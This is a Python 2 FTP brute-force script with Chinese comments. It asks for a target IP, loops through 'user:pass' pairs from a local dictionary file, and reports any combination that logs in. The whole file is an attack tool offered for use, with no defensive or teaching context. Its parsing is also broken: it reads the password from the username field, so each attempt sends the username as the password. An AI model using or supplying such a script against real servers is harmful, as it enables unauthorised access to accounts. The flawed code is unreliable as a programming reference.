import ftplib

burpHost = raw_input('输入你要破解的ftp的ip鸭！：')#注意输入格式为标准ip地址
def  burpLogin(hostname,passwordFile):
    pf = open(passwordFile,'r')#读写字典
    for line in pf.readlines():
        username = line.split(':')[0]#进行列表索引
        password = line.split(':')[0].strip('\r').strip('\n')
        print "[*] 正在尝试:" +username+"/"+password
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username,password)#用字典登陆ftp，字典格式为admin:admin！！
            print '\n[^]' +str(hostname)+'这个ftp帐号密码可以登录哦～：' +username+"/"+password
            print ftp.quit()#如果可以即退出
            return (username,password)
        except Exception,e:
            pass#出错不做任何处理
    print 'Error [#_#] 没有任何一个密码可以爆破'
    return (None,None)
host = burpHost
passwordFile = "user.txt"#注意！！这里重点！！字典格式为admin:admin,导入字典并且字典在这个py文件同一目录下！！！
burpLogin(host,passwordFile)
